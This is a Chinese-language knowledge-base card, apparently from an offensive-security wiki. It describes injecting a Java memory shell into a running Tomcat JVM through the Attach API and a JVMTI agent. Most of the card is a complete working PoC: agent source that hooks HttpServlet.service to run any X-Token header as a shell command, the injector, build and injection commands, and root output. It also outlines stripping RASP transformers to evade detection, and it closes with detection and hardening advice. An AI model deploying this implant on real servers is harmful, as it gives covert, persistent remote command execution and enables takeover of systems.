---
id: web-java-classloader-attach-api-jvmti-agent-memory-shell
title: Java Attach API 加载 JVMTI Agent 改写 HttpServlet.service 实现内存马
type: scenario
domain: web
path: web/java/classloader
technique: java-attach-api-jvmti-agent-retransform-memshell
tags:
- java
- jvm
- attach-api
- jvmti
- instrumentation
- retransform
- javassist
- memory-shell
- tomcat
- servlet
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:34:32+08:00'
  notes: '已对照原文与图14/15/18/23核对：VirtualMachine.attach + loadAgent 成功，catalina.out 显示 Bytecode modified 11111→12304 与 HttpServlet retransformed OK，X-Token: whoami / id 返回 root，任意路径可触发，不带 X-Token 时业务正常（图19 返回 200）。原文图17 的 cat /etc/passwd 截图显示的是 Tomcat 默认页（未体现 passwd 输出），但 id/whoami 已充分证明命令执行。卡中 Hook HttpServlet.service 的前提是子类未覆盖该方法，属实现边界。原文未涉及受影响版本区间。未执行 PoC。'
url: /docs/web/java/classloader/web-java-classloader-attach-api-jvmti-agent-memory-shell/
draft: false
kb_aliases:
- Attach API 内存注入
- JVMTI Agent 内存马
- retransformClasses 内存马
- HttpServlet.service 字节码注入
- Java Agent 动态注入
---

## 一句话结论

在目标主机获得与 Java 进程同 UID（或 root）的 Shell 后，可通过 Attach API 把 JVMTI Agent 加载进运行中的 JVM，用 `Instrumentation.retransformClasses()` 改写 `HttpServlet.service()`，在内存中植入按请求头触发命令执行的内存马，无需重启、无需改启动参数、无需长期落盘。

## 原理

- `com.sun.tools.attach` 提供进程间 Attach 能力：外部进程调用 `VirtualMachine.attach(pid)` 连接到目标 JVM，再 `loadAgent(jarPath)` 让 JVM 加载指定 Agent。
- Agent JAR 的 `MANIFEST.MF` 声明 `Agent-Class` 与 `Can-Retransform-Classes: true`。Attach 方式加载时 JVM 调用 `agentmain(String, Instrumentation)`，而不是启动时的 `premain`。
- `Instrumentation.addTransformer(transformer, true)` 注册可重转换的 Transformer；`retransformClasses(HttpServlet.class)` 触发 Transformer 针对已加载类重新生成字节码。
- 用 javassist 定位 `javax.servlet.http.HttpServlet.service(HttpServletRequest, HttpServletResponse)`，`insertBefore(payload)` 把代码插到方法入口。`service()` 是所有 HTTP 方法（GET/POST/PUT…）和所有 URL 路径的统一入口，因此任意请求都会经过被改写的字节码。
- 载荷读取 `X-Token` 请求头；存在时用 `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})` 执行命令，把输出写回响应并 `return`，从而跳过原始 Servlet 逻辑，避免正常页面干扰。
- 变量加 `_` 前缀避免与 `service()` 原有局部变量冲突；`$1`/`$2` 是 javassist 对第一、第二个方法参数的引用语法。
- AttachListener 是懒加载的：JVM 启动时默认不创建。首次 Attach 时，外部进程创建 `/tmp/.attach_pid<PID>` 并向目标发送 `SIGQUIT`，JVM 的 Signal Dispatcher 检测后启动 AttachListener，并创建 Unix Socket `/tmp/.java_pid<PID>`。因此首次注入会产生这两个痕迹。

## 触发条件

- 攻击者已在目标主机获得 Shell，且与目标 JVM 进程同 UID（或 root/具备 `CAP_SYS_PTRACE`）；跨 UID 时 Attach 会因权限失败。
- 目标 JVM 未使用 `-XX:+DisableAttachMechanism` 禁用 Attach。
- `/tmp` 可写，目标 JVM 的 `java.io.tmpdir` 未被 systemd `PrivateTmp` 等机制隔离，或攻击者能在 JVM 可见的 tmp 目录创建 `.attach_pid*`。
- 目标容器使用 Servlet API（如 Tomcat），`HttpServlet` 已加载且可被重转换。
- Agent JAR 可被目标 JVM 读取（本地路径或 `/proc/<pid>/fd/<n>`）。

## 利用步骤

1. 确认目标 JVM 与容器：`ps -ef | grep catalina`、`curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/`。
2. 确认 Attach 痕迹与可用性：`ls -la /tmp/.java_pid*`（不存在说明尚未被 Attach 过）、`java -version`。
3. 编写 Agent：`agentmain` 中注册 Transformer，对 `HttpServlet` 调用 `retransformClasses`；Transformer 用 javassist 在 `service()` 前插入载荷。
4. 编写 `MANIFEST.MF`，声明 `Agent-Class`、`Can-Retransform-Classes: true`、`Can-Redefine-Classes: true`，打包为 `agent.jar`（javassist 类一并打入）。
5. 编写注入器：`VirtualMachine.list()` 枚举 JVM，`VirtualMachine.attach(pid)`、`loadAgent(agentPath)`、`detach()`。
6. 执行注入，查看目标日志出现类似 `[Agent] HttpServlet retransformed OK`。
7. 用 `curl -H 'X-Token: id' http://127.0.0.1:8080/` 触发；不带该头时业务应保持正常。

## PoC

```java
// MemShellAgent.java（核心结构）
import java.lang.instrument.*;
import javassist.*;

public class MemShellAgent {
    public static void agentmain(String args, Instrumentation inst) throws Exception {
        inst.addTransformer(new ClassFileTransformer() {
            public byte[] transform(ClassLoader loader, String className, Class<?> cls,
                                    java.security.ProtectionDomain pd, byte[] bytecode) {
                if (!"javax/servlet/http/HttpServlet".equals(className)) return null;
                try {
                    ClassPool pool = ClassPool.getDefault();
                    pool.appendClassPath(new LoaderClassPath(loader));
                    CtClass cc = pool.get("javax.servlet.http.HttpServlet");
                    CtMethod m = cc.getDeclaredMethod("service", new CtClass[]{
                        pool.get("javax.servlet.http.HttpServletRequest"),
                        pool.get("javax.servlet.http.HttpServletResponse")});
                    m.insertBefore(
                        "String _c=((javax.servlet.http.HttpServletRequest)$1).getHeader(\"X-Token\");" +
                        "if(_c!=null){Process _p=Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",_c});" +
                        "java.io.InputStream _i=_p.getInputStream();int _n;byte[] _b=new byte[4096];" +
                        "StringBuilder _s=new StringBuilder();" +
                        "while((_n=_i.read(_b))!=-1)_s.append(new String(_b,0,_n));" +
                        "((javax.servlet.http.HttpServletResponse)$2).getWriter().print(_s.toString());" +
                        "((javax.servlet.http.HttpServletResponse)$2).getWriter().flush();return;}");
                    byte[] out = cc.toBytecode();
                    cc.detach();
                    return out;
                } catch (Exception e) { return null; }
            }
        }, true);
        for (Class<?> c : inst.getAllLoadedClasses()) {
            if (c.getName().equals("javax.servlet.http.HttpServlet") && inst.isModifiableClass(c)) {
                inst.retransformClasses(c);
                break;
            }
        }
    }
}
```

```text
MANIFEST.MF
Manifest-Version: 1.0
Agent-Class: MemShellAgent
Can-Retransform-Classes: true
Can-Redefine-Classes: true
```

```java
// Injector.java
import com.sun.tools.attach.VirtualMachine;

public class Injector {
    public static void main(String[] a) throws Exception {
        VirtualMachine vm = VirtualMachine.attach(a[0]);
        vm.loadAgent(new java.io.File(a[1]).getAbsolutePath());
        vm.detach();
    }
}
```

```bash
javac -cp javassist.jar -d build MemShellAgent.java
cd build && jar xf ../javassist.jar javassist && cd ..
jar cmf META-INF/MANIFEST.MF agent.jar -C build .
javac Injector.java
TARGET_PID=$(pgrep -f 'catalina.startup.Bootstrap')
java Injector "$TARGET_PID" agent.jar
curl -s -H 'X-Token: id' http://127.0.0.1:8080/
```

```text
# 目标日志：
[Agent] Loaded via Attach API, pid=<pid>
[Agent] Bytecode modified, size: 11111 -> 12304
[Agent] HttpServlet retransformed OK

# 触发结果：
uid=0(root) gid=0(root) groups=0(root)
```

## 变体与关联

- 变体：Hook `doGet`/`doPost` 或框架类（`HttpServletBean`、Filter、Tomcat Valve）；Hook 点越靠近请求入口，路径覆盖越广。
- 变体：不落盘注入见 [[web-java-classloader-memfd-fileless-agent-injection]]（memfd + 原始 Attach 协议）。
- 变体：原文给出通过反射访问 `InstrumentationImpl.mTransformerManager`、按类名匹配并 `removeTransformer()` 摘除 RASP Transformer 的思路，但未提供实测结果，且依赖 JDK 内部字段名，稳定性随版本变化；仅作对抗思路记录。
- 关联：[[web-java-classloader-asm-retransform-auth-bypass]]（同一 Attach + retransform 机制，但用 ASM 篡改认证/业务逻辑，不植入命令马）；[[pentest-lateral-movement-java-attach-socket-container-injection]]（共享 /tmp 容器场景的 Attach Socket 注入与协议细节）；[[web-java-classloader-jsp-memory-servlet-webshell]]（通过 JSP 注册内存 Servlet，结果同为内存马但入口不同）；[[web-java-classloader-servletcontainerinitializer-spi-backdoor]]（SPI 自动加载后门）。
- 边界：需要同 UID/root 与未禁用 Attach；JDK 新版本会在日志中警告“Dynamic loading of agents will be disallowed by default in a future release”；若目标启用 RASP 且无法摘除 Transformer，重转换可能被拦截或告警。

## 检测与防御

- 检测：巡检 `/tmp/.java_pid*`、`.attach_pid*` 的创建时间；`jcmd <pid> Thread.print | grep 'Attach Listener'` 查看线程是否存在及其 CPU 时间；对关键类字节码做基线哈希（`jcmd GC.class_stats` 或 Agent 侧校验）；用 eBPF 监控对 `/tmp/.java_pid*` 的 `connect()` 与 `SIGQUIT` 发送源；监控 `retransformClasses` 相关告警（RASP）。
- 修复/加固：启动参数加 `-XX:+DisableAttachMechanism` 从根本禁用 Attach；systemd 服务设置 `PrivateTmp=true` 隔离 `/tmp`，使外部进程创建的 `.attach_pid` 对 JVM 不可见；限制目标 JVM 运行账户与 Shell 访问。
- 缓解：部署 RASP 并保护其 Transformer；定期比对内存中类字节码；对 `/tmp` 挂载 `noexec,nosuid` 并监控异常文件创建。
